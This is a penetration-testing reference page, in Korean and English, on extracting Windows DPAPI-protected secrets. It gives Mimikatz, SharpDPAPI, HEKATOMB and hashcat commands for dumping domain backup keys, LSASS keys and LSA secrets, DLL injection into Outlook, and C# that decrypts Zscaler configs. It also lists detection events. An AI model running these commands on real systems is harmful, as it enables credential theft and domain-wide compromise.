# DPAPI - 비밀번호 추출

{{#include ../../banners/hacktricks-training.md}}



## DPAPI란 무엇인가

The Data Protection API (DPAPI)는 주로 Windows 운영체제에서 대칭적으로 비대칭 개인 키를 암호화(**symmetric encryption of asymmetric private keys**)하는 데 사용되며, 사용자 또는 시스템 비밀을 중요한 엔트로피 소스로 활용합니다. 이 접근법은 개발자가 암호화 키의 보호를 직접 관리할 필요 없이, 사용자의 로그온 비밀에서 파생된 키를 사용해 데이터를 암호화하거나(사용자 암호화의 경우) 시스템의 도메인 인증 비밀을 사용해 암호화할 수 있게 해 암호화를 단순화합니다.

가장 일반적인 DPAPI 사용 방법은 **`CryptProtectData` and `CryptUnprotectData`** 함수로, 현재 로그인한 세션의 프로세스와 함께 데이터를 안전하게 암호화하고 복호화할 수 있게 합니다. 즉, 암호화된 데이터는 해당 데이터를 암호화한 동일한 사용자나 시스템만 복호화할 수 있습니다.

또한 이 함수들은 암호화 및 복호화 시 사용되는 **`entropy` parameter**도 허용하므로, 이 파라미터를 사용해 암호화된 것을 복호화하려면 암호화 시 사용된 것과 동일한 entropy 값을 제공해야 합니다.

### 사용자 키 생성

DPAPI는 사용자 자격 증명을 기반으로 각 사용자에 대해 고유한 키(일명 **`pre-key`**)를 생성합니다. 이 키는 사용자의 비밀번호와 기타 요소로부터 파생되며, 알고리즘은 사용자 유형에 따라 다르지만 최종적으로는 SHA1으로 처리됩니다. 예를 들어 도메인 사용자에 대해서는 **사용자의 NTLM 해시(NTLM hash)에 따라 달라집니다**.

이는 공격자가 사용자의 비밀번호 해시를 획득할 수 있다면 특히 중요합니다. 공격자는:

- 해당 사용자의 키로 DPAPI를 사용해 암호화된 어떤 데이터든 **API에 연락할 필요 없이 복호화**할 수 있고,
- 유효한 DPAPI 키를 생성하려고 **비밀번호를 오프라인에서 크랙**해볼 수 있습니다.

게다가 사용자가 DPAPI를 사용해 데이터를 암호화할 때마다 새로운 **마스터 키**가 생성됩니다. 이 마스터 키가 실제로 데이터를 암호화하는 데 사용되는 키입니다. 각 마스터 키에는 이를 식별하는 **GUID**(Globally Unique Identifier)가 부여됩니다.

마스터 키는 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** 디렉터리에 저장되며, 여기서 `{SID}`는 해당 사용자의 Security Identifier입니다. 마스터 키는 사용자의 **`pre-key`**로 암호화되어 저장되며, 복구를 위한 **도메인 백업 키(domain backup key)**로도 암호화되어 저장됩니다(따라서 동일한 키가 서로 다른 두 경로로 두 번 암호화되어 저장됩니다).

도메인 컨트롤러에 접근할 수 있는 공격자는 **마스터 키를 암호화하는 데 사용된 도메인 키가 도메인 컨트롤러에 존재하고 변경되지 않음**을 이용해 도메인 백업 키를 획득하면 도메인의 모든 사용자 마스터 키를 복호화할 수 있다는 점에 유의하세요.

암호화된 블롭에는 내부 헤더에 데이터를 암호화하는 데 사용된 **마스터 키의 GUID**가 포함되어 있습니다.

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

마스터 키 찾기:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System key generation

This is key used for the machine to encrypt data. It's based on the **DPAPI_SYSTEM LSA secret**, which is a special key that only the SYSTEM user can access. This key is used to encrypt data that needs to be accessible by the system itself, such as machine-level credentials or system-wide secrets.

Note that these keys **don't have a domain backup** so they are only accesisble locally:

- **Mimikatz** can access it dumping LSA secrets using the command: `mimikatz lsadump::secrets`
- The secret is stored inside the registry, so an administrator could **modify the DACL permissions to access it**. The registry path is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Protected Data by DPAPI

Among the personal data protected by DPAPI are:

- Windows creds
- Internet Explorer and Google Chrome's passwords and auto-completion data
- E-mail and internal FTP account passwords for applications like Outlook and Windows Mail
- Passwords for shared folders, resources, wireless networks, and Windows Vault, including encryption keys
- Passwords for remote desktop connections, .NET Passport, and private keys for various encryption and authentication purposes
- Network passwords managed by Credential Manager and personal data in applications using CryptProtectData, such as Skype, MSN messenger, and more
- Encrypted blobs inside the register
- ...

System protected data includes:
- Wifi passwords
- Scheduled task passwords
- ...

### Master key extraction options

- If the user has domain admin privileges, they can access the **domain backup key** to decrypt all user master keys in the domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- local admin privileges가 있으면, **access the LSASS memory**를 통해 연결된 모든 사용자의 DPAPI master keys와 SYSTEM key를 추출할 수 있습니다.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- 사용자가 로컬 관리자 권한이면 **DPAPI_SYSTEM LSA secret**에 접근해 머신 마스터 키를 복호화할 수 있습니다:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- 사용자 password 또는 hash NTLM이 알려져 있으면, **사용자의 master keys를 직접 decrypt할 수 있습니다**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- 사용자의 세션으로 접속해 있다면, DC에 **backup key to decrypt the master keys using RPC**를 요청할 수 있습니다. 만약 당신이 local admin이고 사용자가 로그인되어 있다면, 이를 위해 그의 **session token**을 훔칠 수 있습니다:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault 목록
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI 암호화된 데이터에 접근

### DPAPI 암호화된 데이터 찾기

일반 사용자의 **보호된 파일** 위치:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 위 경로들에서 `\Roaming\`을 `\Local\`로 변경해서도 확인하세요.

열거 예시:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)은 file system, registry, B64 blobs에서 DPAPI encrypted blobs를 찾을 수 있습니다:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
참고: [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (같은 repo)는 DPAPI로 암호화된 cookies 같은 민감한 데이터를 복호화하는 데 사용할 수 있다.

### 액세스 키 및 데이터

- **SharpDPAPI를 사용**하여 현재 세션의 DPAPI로 암호화된 파일에서 credentials를 얻는다:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **credentials 정보 가져오기**: encrypted data와 guidMasterKey를 가져옵니다.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **masterkeys 접근**:

RPC를 사용하여 **domain backup key**를 요청한 사용자의 masterkey를 복호화합니다:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
The **SharpDPAPI** 도구는 마스터키 복호화를 위해 다음 인수를 지원합니다( `/rpc` 를 사용해 도메인의 백업 키를 얻거나, `/password` 로 평문 비밀번호를 사용하거나, `/pvk` 로 DPAPI 도메인 개인 키 파일을 지정할 수 있는 점에 유의하세요...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **masterkey를 사용하여 데이터를 복호화**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
The **SharpDPAPI** 도구는 또한 `credentials|vaults|rdg|keepass|triage|blob|ps` 복호화를 위해 다음 인수를 지원합니다 (참고로 `/rpc`를 사용해 domains backup key를 얻을 수 있고, `/password`로 plaintext password를 사용할 수 있으며, `/pvk`로 DPAPI domain private key file을 지정할 수 있고, `/unprotect`로 current users session을 사용할 수 있습니다...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- **current user session**을 사용하여 일부 데이터를 복호화:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Handling Optional Entropy ("Third-party entropy")

어떤 애플리케이션은 추가적인 **entropy** 값을 `CryptProtectData`에 전달합니다. 이 값이 없으면 올바른 masterkey를 알고 있더라도 blob을 복호화할 수 없습니다. 따라서 이러한 방식으로 보호된 자격 증명(예: Microsoft Outlook, 일부 VPN 클라이언트)을 대상으로 할 때 entropy를 확보하는 것이 필수적입니다.

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022)는 대상 프로세스 내부의 DPAPI 함수에 훅을 걸고 제공된 선택적 entropy를 투명하게 기록하는 사용자 모드 DLL입니다. `outlook.exe`나 `vpnclient.exe` 같은 프로세스에 대해 EntropyCapture를 **DLL-injection** 모드로 실행하면 각 entropy 버퍼를 호출 프로세스 및 blob에 매핑한 파일을 출력합니다. 캡처된 entropy는 나중에 **SharpDPAPI** (`/entropy:`)나 **Mimikatz** (`/entropy:<file>`)에 제공되어 데이터를 복호화하는 데 사용할 수 있습니다.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft는 Windows 10 v1607 (2016)부터 **context 3** 마스터키 형식을 도입했습니다. `hashcat` v6.2.6 (2023년 12월)은 해시 모드 **22100** (DPAPI masterkey v1 context), **22101** (context 1) 및 **22102** (context 3)을 추가하여 마스터키 파일에서 바로 사용자 비밀번호를 GPU로 가속화하여 크래킹할 수 있게 했습니다. 따라서 공격자는 대상 시스템과 상호작용하지 않고도 워드-list 또는 brute-force 공격을 수행할 수 있습니다.

`DPAPISnoop` (2024)은 이 과정을 자동화합니다:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
The tool can also parse Credential and Vault blobs, decrypt them with cracked keys and export cleartext passwords.

### 다른 머신의 데이터 접근

In **SharpDPAPI and SharpChrome** you can indicate the **`/server:HOST`** option to access a remote machine's data. Of course you need to be able to access that machine and in the following example it's supposed that the **domain backup encryption key is known**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## 기타 도구

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) 는 LDAP 디렉터리에서 모든 사용자와 컴퓨터를 추출하고 RPC를 통해 도메인 컨트롤러 백업 키를 추출하는 작업을 자동화하는 도구입니다. 스크립트는 추출된 각 컴퓨터의 IP 주소를 확인한 다음 모든 컴퓨터에서 smbclient를 실행하여 모든 사용자의 DPAPI 블롭을 획득하고 도메인 백업 키로 모든 것을 복호화합니다.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP에서 추출한 컴퓨터 목록으로, 존재를 몰랐던 서브네트워크까지 모두 찾을 수 있습니다!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) 는 DPAPI로 보호된 비밀을 자동으로 덤프할 수 있습니다. 2.x 릴리스에서 도입된 기능:

* 수백 대 호스트에서 병렬로 블롭 수집
* **context 3** 마스터키 파싱 및 Hashcat 자동 크래킹 통합
* Chrome "App-Bound" 암호화 쿠키 지원 (다음 섹션 참조)
* 엔드포인트를 반복적으로 폴링하고 새로 생성된 블롭을 비교하는 새로운 **`--snapshot`** 모드

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) 는 masterkey/credential/vault 파일을 파싱하는 C# 파서로 Hashcat/JtR 포맷을 출력하고 선택적으로 자동으로 크래킹을 호출할 수 있습니다. Windows 11 24H1까지의 머신 및 사용자 마스터키 포맷을 완전히 지원합니다.


## 일반적인 탐지

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 및 기타 DPAPI 관련 디렉터리의 파일에 대한 접근.
- 특히 **C$** 또는 **ADMIN$** 같은 네트워크 공유를 통해.
- LSASS 메모리에 접근하거나 마스터키를 덤프하기 위해 **Mimikatz**, **SharpDPAPI** 또는 유사 도구를 사용하는 행위.
- 이벤트 **4662**: *An operation was performed on an object* – **`BCKUPKEY`** 객체에 대한 접근과 연관될 수 있습니다.
- 프로세스가 *SeTrustedCredManAccessPrivilege* 권한을 요청할 때의 이벤트 **4673/4674** (Credential Manager)

---
### 2023-2025 취약점 및 생태계 변화

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). 네트워크 접근 권한을 가진 공격자는 도메인 멤버가 악성 DPAPI 백업 키를 가져오도록 속여 사용자 마스터키를 복호화할 수 있었습니다. 2023년 11월 누적 업데이트에서 패치되었으므로 관리자들은 도메인 컨트롤러(DC)와 워크스테이션이 완전히 패치되었는지 확인해야 합니다.
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) 은 기존의 DPAPI 전용 보호를 사용자 **Credential Manager**에 저장되는 추가 키로 대체했습니다. 쿠키의 오프라인 복호화는 이제 DPAPI 마스터키와 **GCM-wrapped app-bound key** 둘 다 필요합니다. SharpChrome v2.3 및 DonPAPI 2.x는 사용자 컨텍스트로 실행할 때 이 추가 키를 복구할 수 있습니다.


### 사례 연구: Zscaler Client Connector – SID에서 유도된 커스텀 엔트로피

Zscaler Client Connector는 `C:\ProgramData\Zscaler` 아래에 여러 구성 파일(예: `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`)을 저장합니다. 각 파일은 **DPAPI (Machine scope)**로 암호화되지만, 공급업체는 디스크에 저장하는 대신 런타임에 *계산되는* **custom entropy**를 제공합니다.

엔트로피는 다음 두 요소로부터 재구성됩니다:

1. `ZSACredentialProvider.dll`에 내장된 하드코딩된 시크릿.
2. 구성 대상 Windows 계정의 **SID**.

DLL에 구현된 알고리즘은 다음과 동일합니다:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
비밀이 디스크에서 읽을 수 있는 DLL에 포함되어 있기 때문에, **SYSTEM 권한을 가진 모든 로컬 공격자는 임의의 SID에 대한 entropy를 재생성할 수 있으며** blobs를 오프라인으로 복호화할 수 있다:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
복호화하면 모든 **device posture check**와 그 예상 값이 포함된 전체 JSON 구성이 드러납니다 — 이는 client-side bypasses를 시도할 때 매우 유용한 정보입니다.

> TIP: 나머지 암호화된 아티팩트 (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`)는 DPAPI **without** entropy (`16` zero bytes)로 보호되어 있습니다. 따라서 SYSTEM 권한을 얻으면 `ProtectedData.Unprotect`로 직접 복호화할 수 있습니다.

## 참고자료

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
